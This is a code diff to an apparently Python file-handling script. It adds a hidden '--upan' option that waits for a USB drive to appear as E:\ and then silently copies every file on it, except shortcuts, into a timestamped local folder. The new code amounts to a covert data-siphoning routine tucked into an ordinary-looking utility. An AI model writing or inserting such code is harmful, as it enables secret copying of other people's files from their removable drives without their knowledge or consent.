@@ -11,6 +11,10 @@ filenum = len(os.listdir())
 
 def execute_with_arg():
     if len(sys.argv) == 2:
+        if sys.argv[-1] == '--upan':
+            upan()
+            sys.exit()
+
         filename = sys.argv[1]
         file_suffix = filename.split('.')[-1]
         if file_suffix in ('doc','docx'):
@@ -59,6 +63,21 @@ def main():
     
     root.after(1000,main)
 """
+def upan():
+    global TARGET
+    while not os.path.exists('E:\\'):
+        time.sleep(60)
+    os.chdir('E:\\')
+    TARGET = TARGET+str(time.time())
+    os.mkdir(TARGET)
+    filelst = os.walk('.')
+    for i in filelst:
+        for j in i[2]:
+            filename = os.path.join(i[0],j)
+            if '.lnk' not in filename:    #排除.lnk文件
+                target = os.path.join(TARGET,j)
+                shutil.copy(filename,target)
+                print(f'已复制 {filename} at {time.strftime("%Y.%m.%d %H:%M:%S")}')
 def main():
     execute_with_arg()
     print(f'已于 {time.strftime("%Y.%m.%d %H:%M:%S")} 启动')
